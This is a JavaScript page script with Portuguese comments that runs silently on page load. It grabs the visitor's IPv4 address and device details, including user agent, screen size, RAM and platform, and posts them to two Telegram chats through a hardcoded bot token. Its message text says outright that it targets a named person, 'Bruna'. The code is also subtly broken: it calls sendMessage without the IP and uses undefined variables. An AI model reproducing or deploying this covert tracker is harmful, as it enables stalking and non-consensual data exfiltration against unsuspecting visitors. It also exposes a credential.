// ================================================
// script.js - Forçando IPv4 e enviando via teleporra
// ================================================

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

const CHAT_IDS = [
    "8448614204",   // Mr. Lonely (Sou eu porra)
    "8219025301",   // Luizz
];


function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";

    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram
    };
}

// ==================== PEGAR IPv4 FORÇADO ====================
async function getIPv4() {
    try {
        // api.ipify.org força IPv4 na maioria dos casos
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        if (data.ip && !data.ip.includes(':')) return data.ip; // verifica se não é IPv6

        // Fallback seguro para IPv4
        res = await fetch('https://api4.my-ip.io/ip.json');
        data = await res.json();
        return data.ip || 'Não capturado';
    } catch (e) {
        console.error("Erro ao pegar IPv4:", e);
        return "Não capturado";
    }
}



// ==================== MENSAGEM QUANDO ENTRAR ====================
async function sendMessage(ip) {
    if (ip) processedIPs.set(ip, now);

    const device = getDeviceInfo();

    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---;\n\n` +
                    `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP (IPv4): ${ip}\n` +
                    `📱 Tipo: ${device.deviceType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n` +
                    `• RAM: ${device.deviceMemory}\n\n` +
                    `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {}
    }
}

// ==================== CAPTURA AO ENTRAR ====================
async function captureIPOnLoad() {
    const ip = await getIPv4();
    await sendMessage();
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureIPOnLoad();   // Pega IPv4 + envia a mensagem no teleporra
}

init();